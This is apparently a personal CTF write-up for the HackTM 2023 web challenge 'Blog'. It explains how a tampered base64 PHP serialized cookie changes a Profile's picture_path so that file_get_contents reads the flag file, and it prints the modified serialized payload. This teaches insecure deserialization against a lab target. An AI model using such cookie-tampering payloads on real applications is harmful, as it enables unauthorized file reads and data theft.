---
title: HackTM CTF 2023 - Writeup
author: H0j3n
date: 2023-02-19 00:00:00
categories: [ctf]
tags: [ctf,writeup]
render_with_liquid: false
---

This write-up serves as a personal reference and a tool for me to practice CTF. It includes information and solutions collected from various sources, including challenges that were not solved during the event.

### Category : Web

#### Web : Blog

> We made a new blogging website for everyone to use! It's pretty basic for now, and it has a few limitations like:
> 1. No comments
> 2. Semi-working authentication system
> 3. Lots of random checks slowing down the entire website honestly (i don't know what's going on so i'm not touching it)
> 
> To mitigate that, we made it such that only you can view your own posts. No one
can hack us now >:)
> 
> Link: [http://34.141.16.87:30000/](http://34.141.16.87:30000/)
> 
> File: `dist.zip`

We received a file named `dist.zip`, which includes a dockerfile that contains a `COPY` function to transfer the contents of `./chal/flag.txt` to `/02d92f5f-a58c-42b1-98c7-746bbda7abe9/flag.txt`

> `COPY`: The `COPY` instruction in a Dockerfile is used to copy files or directories from the host machine into the container during the build process.
{: .prompt-info }

![](https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/5_hacktm2023/hacktm1.png)

In `util.php`, the `file_get_contents` PHP function is used to retrieve a user's profile image. 

```php
class Profile {
	public function __toString() {
			// ------snip------
	        $picture = base64_encode(file_get_contents($this->picture_path));
	        // ------snip------
	    }
}
```

When a new account is registered and a user logs in, a cookie is generated that contains a serialized PHP object in base64 format.

- **Encoded Base64** 
```bash
Tzo0OiJVc2VyIjoyOntzOjc6InByb2ZpbGUiO086NzoiUHJvZmlsZSI6Mjp7czo4OiJ1c2VybmFtZSI7czo4OiJhZG1pbjMyMSI7czoxMjoicGljdHVyZV9wYXRoIjtzOjI3OiJpbWFnZXMvcmVhbF9wcm9ncmFtbWVycy5wbmciO31zOjU6InBvc3RzIjthOjA6e319
```

- **Decoded Base64**
```bash
O:4:"User":2:{s:7:"profile";O:7:"Profile":2:{s:8:"username";s:8:"admin321";s:12:"picture_path";s:27:"images/real_programmers.png";}s:5:"posts";a:0:{}}
```

The serialized PHP object contains the path to the user's profile image. When the server responds to the user's request, the response includes the base64-encoded content of the user's profile image.

![](https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/5_hacktm2023/hacktm2.png)

To retrieve the flag, we modify the path to the profile image in the serialized PHP object to point to the flag path, and then decode the base64 response.

```bash
O:4:"User":2:{s:7:"profile";O:7:"Profile":2:{s:8:"username";s:8:"admin321";s:12:"picture_path";s:46:"/02d92f5f-a58c-42b1-98c7-746bbda7abe9/flag.txt";}s:5:"posts";a:0:{}}
```

![](https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/5_hacktm2023/hacktm3.png)

Flag: `HackTM{r3t__toString_1s_s0_fun_13c573f6}`

